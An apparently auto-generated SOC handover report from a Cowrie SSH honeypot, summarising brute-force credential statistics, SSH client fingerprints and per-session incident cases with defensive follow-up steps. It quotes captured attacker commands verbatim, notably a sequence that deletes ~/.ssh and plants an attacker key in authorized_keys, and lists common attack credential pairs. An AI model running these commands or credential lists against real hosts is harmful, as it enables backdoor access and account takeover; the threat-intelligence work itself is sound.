# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-10-29 |
| **Generated At** | 2026-10-29T17:48:25Z |
| **Shift Time** | 17:48 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **514** |
| Confirmed Threats | **456** |
| False Positives Filtered | **58** (11.3%) |
| Unique Attacker IPs | **300** |
| Countries of Origin | **51** |
| High Severity Cases | **299** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **215** |
| Malware Samples Analyzed | **9** HIGH · **25** MED · 0 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **2813** |
| Unique Credential Pairs | **1763** |
| Unique Usernames | **641** |
| Unique Passwords | **1232** |
| Successful Auth Pairs | **2600** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 893 |
| `345gs5662d34` | 158 |
| `ubuntu` | 128 |
| `admin` | 54 |
| `support` | 54 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `3245gs5662d34` | 159 |
| `345gs5662d34` | 158 |
| `123456` | 128 |
| `123` | 65 |
| `1234` | 44 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 158 |
| `root` | `3245gs5662d34` | 107 |
| `support` | `support` | 40 |
| `pi` | `abcd1234` | 14 |
| `pi` | `starfish` | 11 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `samba` | `sambarana` | `195.178.110.218` | 2026-10-29T02:55:09 |
| `samba` | `12345678` | `195.178.110.218` | 2026-10-29T02:55:31 |
| `samba` | `123456` | `195.178.110.218` | 2026-10-29T02:55:53 |
| `root` | `13579` | `195.178.110.218` | 2026-10-29T02:56:15 |
| `ems` | `ems` | `195.178.110.218` | 2026-10-29T02:56:37 |
| `controller` | `controller` | `195.178.110.218` | 2026-10-29T02:56:59 |
| `ems` | `ems@123` | `195.178.110.218` | 2026-10-29T02:57:20 |
| `xxx` | `xxx@123` | `195.178.110.218` | 2026-10-29T02:57:42 |
| `root` | `xxx!@#` | `195.178.110.218` | 2026-10-29T02:58:04 |
| `bugzilla` | `bugzilla` | `195.178.110.218` | 2026-10-29T02:58:26 |
| `johnny` | `johnny` | `195.178.110.218` | 2026-10-29T02:58:48 |
| `marcos` | `marcos` | `195.178.110.218` | 2026-10-29T02:59:11 |
| `macos` | `macos` | `195.178.110.218` | 2026-10-29T02:59:34 |
| `netcat` | `netcat` | `195.178.110.218` | 2026-10-29T02:59:57 |
| `ollama` | `ollama` | `195.178.110.218` | 2026-10-29T03:00:20 |
| `yolo` | `yolo` | `195.178.110.218` | 2026-10-29T03:00:44 |
| `snack` | `snack` | `195.178.110.218` | 2026-10-29T03:01:08 |
| `nobara` | `nobara` | `195.178.110.218` | 2026-10-29T03:01:31 |
| `was` | `Director` | `195.178.110.218` | 2026-10-29T03:01:55 |
| `was` | `wadmin` | `195.178.110.218` | 2026-10-29T03:02:19 |
_… 2580 more successful pair(s) in credentials.json_

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **514** |
| Sessions with Fingerprint | **30** |
| Unique HASSH Fingerprints | **30** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 248 |
| Go SSH scanner | 73 |
| OpenSSH | 17 |
| Unknown | 6 |
| AsyncSSH (Python) | 3 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 221 | 109 |
| `2ec37a7cc8da...` | Mirai/variant | 39 | 3 |
| `390ffe68a68c...` | Modern SSH client | 14 | 3 |
| `16443846184e...` | Generic scanner | 12 | 6 |
| `03a80b21afa8...` | Modern SSH client | 6 | 5 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 221 | 109 | Mirai/variant |
| `2ec37a7cc8da...` | Go SSH scanner | 39 | 3 | Mirai/variant |
| `95420f9d932d...` | libssh | 15 | 8 | — |
| `390ffe68a68c...` | OpenSSH | 14 | 3 | Modern SSH client |
| `16443846184e...` | Go SSH scanner | 12 | 6 | Generic scanner |
| `03a80b21afa8...` | libssh | 6 | 5 | Modern SSH client |
| `dd9bcf093c35...` | Unknown | 4 | 4 | Mirai/variant |
| `eff4c24daffc...` | Go SSH scanner | 4 | 1 | Modern SSH client |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **50** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 3 | 3 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 100 | 96 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo -e "123456\nOJhIFlombJVO\nOJhIFlombJVO"|passwd|bash
```
```
Enter new UNIX password:
```
Source IPs: `183.232.212.207`, `114.66.42.35`, `118.145.228.55`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `60.199.224.55`, `220.250.52.111`, `197.5.145.150`, `118.122.147.195`, `77.87.40.114`, `201.138.144.42`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **300** |
| Unique ASNs | **142** |
| High-Risk ASNs | **107** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS0` |  | 69 | HIGH |
| `AS31898` | Oracle Corporation | 11 | HIGH |
| `AS398324` | Censys, Inc. | 9 | HIGH |
| `AS8075` | Microsoft Corporation | 9 | HIGH |
| `AS4766` | Korea Telecom | 9 | HIGH |
| `AS396982` | Google LLC | 8 | HIGH |
| `AS4837` | CHINA UNICOM China169 Backbone | 4 | HIGH |
| `AS7303` | Telecom Argentina S.A. | 4 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (294)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-28dd91d4af4b

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]218` |
| **First Seen** | 2026-10-29 02:55 |
| **Last Seen** | 2026-10-29 02:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-29 02:55:09` | `cowrie.session.connect` |
| `2026-10-29 02:55:09` | `cowrie.client.version` |
| `2026-10-29 02:55:09` | `cowrie.client.kex` |
| `2026-10-29 02:55:09` | `cowrie.login.success` |
| `2026-10-29 02:55:10` | `cowrie.session.params` |
| `2026-10-29 02:55:10` | `cowrie.command.input` |
| `2026-10-29 02:55:10` | `cowrie.log.closed` |
| `2026-10-29 02:55:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]218` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3b592ac67738

| Field | Detail |
|---|---|
| **Source IP** | `165.154.200[.]214` |
| **First Seen** | 2026-10-29 03:44 |
| **Last Seen** | 2026-10-29 03:44 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-29 03:44:48` | `cowrie.session.connect` |
| `2026-10-29 03:44:48` | `cowrie.client.version` |
| `2026-10-29 03:44:48` | `cowrie.client.kex` |
| `2026-10-29 03:44:49` | `cowrie.login.success` |
| `2026-10-29 03:44:50` | `cowrie.session.params` |
| `2026-10-29 03:44:50` | `cowrie.command.input` |
| `2026-10-29 03:44:50` | `cowrie.command.failed` |
| `2026-10-29 03:44:51` | `cowrie.log.closed` |
| `2026-10-29 03:44:51` | `cowrie.session.params` |
| `2026-10-29 03:44:51` | `cowrie.command.input` |
| `2026-10-29 03:44:52` | `cowrie.session.file_download` |
| `2026-10-29 03:44:52` | `cowrie.log.closed` |
| `2026-10-29 03:44:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.200[.]214` to AbuseIPDB if not already reported
- [ ] Block `165.154.200[.]214` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7bce57e9bd60

| Field | Detail |
|---|---|
| **Source IP** | `165.154.200[.]214` |
| **First Seen** | 2026-10-29 03:44 |
| **Last Seen** | 2026-10-29 03:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-29 03:44:52` | `cowrie.session.connect` |
| `2026-10-29 03:44:52` | `cowrie.client.version` |
| `2026-10-29 03:44:52` | `cowrie.client.kex` |
| `2026-10-29 03:44:54` | `cowrie.login.success` |
| `2026-10-29 03:44:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.200[.]214` to AbuseIPDB if not already reported
- [ ] Block `165.154.200[.]214` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-713168441d9a

| Field | Detail |
|---|---|
| **Source IP** | `129.121.77[.]168` |
| **First Seen** | 2026-10-29 03:45 |
| **Last Seen** | 2026-10-29 03:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-29 03:45:22` | `cowrie.session.connect` |
| `2026-10-29 03:45:22` | `cowrie.client.version` |
| `2026-10-29 03:45:22` | `cowrie.client.kex` |
| `2026-10-29 03:45:22` | `cowrie.login.success` |
| `2026-10-29 03:45:23` | `cowrie.session.params` |
| `2026-10-29 03:45:23` | `cowrie.command.input` |
| `2026-10-29 03:45:23` | `cowrie.command.failed` |
| `2026-10-29 03:45:23` | `cowrie.log.closed` |
| `2026-10-29 03:45:23` | `cowrie.session.params` |
| `2026-10-29 03:45:23` | `cowrie.command.input` |
| `2026-10-29 03:45:23` | `cowrie.session.file_download` |
| `2026-10-29 03:45:23` | `cowrie.log.closed` |
| `2026-10-29 03:45:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.121.77[.]168` to AbuseIPDB if not already reported
- [ ] Block `129.121.77[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f47a1d77335e

| Field | Detail |
|---|---|
| **Source IP** | `129.121.77[.]168` |
| **First Seen** | 2026-10-29 03:45 |
| **Last Seen** | 2026-10-29 03:45 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-29 03:45:23` | `cowrie.session.connect` |
| `2026-10-29 03:45:23` | `cowrie.client.version` |
| `2026-10-29 03:45:23` | `cowrie.client.kex` |
| `2026-10-29 03:45:23` | `cowrie.login.success` |
| `2026-10-29 03:45:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.121.77[.]168` to AbuseIPDB if not already reported
- [ ] Block `129.121.77[.]168` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-97aaea5cc2b9

| Field | Detail |
|---|---|
| **Source IP** | `91.92.199[.]36` |
| **First Seen** | 2026-10-29 03:45 |
| **Last Seen** | 2026-10-29 03:45 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-29 03:45:33` | `cowrie.session.connect` |
| `2026-10-29 03:45:33` | `cowrie.client.version` |
| `2026-10-29 03:45:33` | `cowrie.client.kex` |
| `2026-10-29 03:45:33` | `cowrie.login.success` |
| `2026-10-29 03:45:34` | `cowrie.session.params` |
| `2026-10-29 03:45:34` | `cowrie.command.input` |
| `2026-10-29 03:45:34` | `cowrie.command.failed` |
| `2026-10-29 03:45:34` | `cowrie.log.closed` |
| `2026-10-29 03:45:35` | `cowrie.session.params` |
| `2026-10-29 03:45:35` | `cowrie.command.input` |
| `2026-10-29 03:45:35` | `cowrie.session.file_download` |
| `2026-10-29 03:45:35` | `cowrie.log.closed` |
| `2026-10-29 03:45:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.199[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.199[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8378ce42a127

| Field | Detail |
|---|---|
| **Source IP** | `91.92.199[.]36` |
| **First Seen** | 2026-10-29 03:45 |
| **Last Seen** | 2026-10-29 03:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-29 03:45:35` | `cowrie.session.connect` |
| `2026-10-29 03:45:35` | `cowrie.client.version` |
| `2026-10-29 03:45:35` | `cowrie.client.kex` |
| `2026-10-29 03:45:36` | `cowrie.login.success` |
| `2026-10-29 03:45:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.199[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.199[.]36` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-816237bb1fc5

| Field | Detail |
|---|---|
| **Source IP** | `201.17.146[.]173` |
| **First Seen** | 2026-10-29 03:46 |
| **Last Seen** | 2026-10-29 03:46 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-29 03:46:25` | `cowrie.session.connect` |
| `2026-10-29 03:46:25` | `cowrie.client.version` |
| `2026-10-29 03:46:25` | `cowrie.client.kex` |
| `2026-10-29 03:46:26` | `cowrie.login.success` |
| `2026-10-29 03:46:26` | `cowrie.session.params` |
| `2026-10-29 03:46:26` | `cowrie.command.input` |
| `2026-10-29 03:46:26` | `cowrie.command.failed` |
| `2026-10-29 03:46:27` | `cowrie.log.closed` |
| `2026-10-29 03:46:27` | `cowrie.session.params` |
| `2026-10-29 03:46:27` | `cowrie.command.input` |
| `2026-10-29 03:46:27` | `cowrie.session.file_download` |
| `2026-10-29 03:46:28` | `cowrie.log.closed` |
| `2026-10-29 03:46:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.17.146[.]173` to AbuseIPDB if not already reported
- [ ] Block `201.17.146[.]173` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-56ee5b7004f1

| Field | Detail |
|---|---|
| **Source IP** | `201.17.146[.]173` |
| **First Seen** | 2026-10-29 03:46 |
| **Last Seen** | 2026-10-29 03:46 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-29 03:46:28` | `cowrie.session.connect` |
| `2026-10-29 03:46:28` | `cowrie.client.version` |
| `2026-10-29 03:46:28` | `cowrie.client.kex` |
| `2026-10-29 03:46:28` | `cowrie.login.success` |
| `2026-10-29 03:46:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.17.146[.]173` to AbuseIPDB if not already reported
- [ ] Block `201.17.146[.]173` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f7520f4450b8

| Field | Detail |
|---|---|
| **Source IP** | `117.244.249[.]67` |
| **First Seen** | 2026-10-29 03:46 |
| **Last Seen** | 2026-10-29 03:46 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-29 03:46:33` | `cowrie.session.connect` |
| `2026-10-29 03:46:33` | `cowrie.client.version` |
| `2026-10-29 03:46:33` | `cowrie.client.kex` |
| `2026-10-29 03:46:34` | `cowrie.login.success` |
| `2026-10-29 03:46:35` | `cowrie.session.params` |
| `2026-10-29 03:46:35` | `cowrie.command.input` |
| `2026-10-29 03:46:35` | `cowrie.command.failed` |
| `2026-10-29 03:46:36` | `cowrie.log.closed` |
| `2026-10-29 03:46:37` | `cowrie.session.params` |
| `2026-10-29 03:46:37` | `cowrie.command.input` |
| `2026-10-29 03:46:37` | `cowrie.session.file_download` |
| `2026-10-29 03:46:37` | `cowrie.log.closed` |
| `2026-10-29 03:46:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.244.249[.]67` to AbuseIPDB if not already reported
- [ ] Block `117.244.249[.]67` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bf61d77c45d6

| Field | Detail |
|---|---|
| **Source IP** | `117.244.249[.]67` |
| **First Seen** | 2026-10-29 03:46 |
| **Last Seen** | 2026-10-29 03:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-29 03:46:37` | `cowrie.session.connect` |
| `2026-10-29 03:46:37` | `cowrie.client.version` |
| `2026-10-29 03:46:38` | `cowrie.client.kex` |
| `2026-10-29 03:46:39` | `cowrie.login.success` |
| `2026-10-29 03:46:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.244.249[.]67` to AbuseIPDB if not already reported
- [ ] Block `117.244.249[.]67` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5b327fb87352

| Field | Detail |
|---|---|
| **Source IP** | `173.244.60[.]241` |
| **First Seen** | 2026-10-29 03:51 |
| **Last Seen** | 2026-10-29 03:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-29 03:51:15` | `cowrie.session.connect` |
| `2026-10-29 03:51:15` | `cowrie.client.version` |
| `2026-10-29 03:51:15` | `cowrie.client.kex` |
| `2026-10-29 03:51:15` | `cowrie.login.success` |
| `2026-10-29 03:51:15` | `cowrie.session.params` |
| `2026-10-29 03:51:15` | `cowrie.command.input` |
| `2026-10-29 03:51:15` | `cowrie.command.failed` |
| `2026-10-29 03:51:15` | `cowrie.log.closed` |
| `2026-10-29 03:51:16` | `cowrie.session.params` |
| `2026-10-29 03:51:16` | `cowrie.command.input` |
| `2026-10-29 03:51:16` | `cowrie.session.file_download` |
| `2026-10-29 03:51:16` | `cowrie.log.closed` |
| `2026-10-29 03:51:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `173.244.60[.]241` to AbuseIPDB if not already reported
- [ ] Block `173.244.60[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f7a7c70c16fe

| Field | Detail |
|---|---|
| **Source IP** | `173.244.60[.]241` |
| **First Seen** | 2026-10-29 03:51 |
| **Last Seen** | 2026-10-29 03:51 |
| **Session Duration** | 0s |
